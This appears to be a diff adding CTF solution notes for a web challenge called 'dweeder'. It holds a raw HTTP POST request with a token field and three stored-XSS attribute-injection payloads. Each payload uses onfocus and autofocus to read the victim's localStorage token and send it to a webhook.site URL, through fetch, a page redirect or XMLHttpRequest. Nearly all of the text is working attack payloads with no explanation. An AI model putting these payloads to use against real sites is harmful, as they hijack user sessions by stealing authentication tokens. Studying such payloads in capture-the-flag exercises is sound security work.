@@ -1,0 +1,51 @@
+<div style="margin: 1vh;" onclick="window.location = '?dweed=${id}'" button column>
+
+
+POST /apis/dweeder/?writeDweed HTTP/1.1
+Host: dweeder.ctf.kaf.sh
+Connection: close
+Content-Length: 774
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx0XNqVJ6c4MBIHso
+Accept: */*
+Origin: https://dweeder.ctf.kaf.sh
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://dweeder.ctf.kaf.sh/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+------WebKitFormBoundaryx0XNqVJ6c4MBIHso
+Content-Disposition: form-data; name="token"
+
+eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6ImxlbyIsImhhbmRsZSI6ImxlbyJ9fQ==:ddR5nw5NDlaj17TpQzRA026WRoIzw7eM0BiPWoWzD2Q=
+------WebKitFormBoundaryx0XNqVJ6c4MBIHso
+Content-Disposition: form-data; name="id"
+
+${xss}
+------WebKitFormBoundaryx0XNqVJ6c4MBIHso
+Content-Disposition: form-data; name="title"
+
+123
+------WebKitFormBoundaryx0XNqVJ6c4MBIHso
+Content-Disposition: form-data; name="contents"
+
+@shuky
+------WebKitFormBoundaryx0XNqVJ6c4MBIHso
+Content-Disposition: form-data; name="xss"
+
+"onfocus="fetch('https://webhook.site/a17c8ffe-10ee-4981-ab8b-11c41180b760/?'+localStorage.token)"autofocus="true"contenteditable="true"
+------WebKitFormBoundaryx0XNqVJ6c4MBIHso
+
+OR
+
+Content-Disposition: form-data; name="xss"
+
+/" tabindex="1" onfocus="document.location='https://webhook.site/a17c8ffe-10ee-4981-ab8b-11c41180b760/?'+btoa(window.localStorage.getItem('token'))" autofocus="" a="'"
+
+OR
+
+Content-Disposition: form-data; name="xss"
+
+" onfocus="a=(function(){request=new XMLHttpRequest();request.open('GET','https://webhook.site/a17c8ffe-10ee-4981-ab8b-11c41180b760/?c='+localStorage.getItem('token'),false);request.send(null);})()" autofocus contenteditable bla="
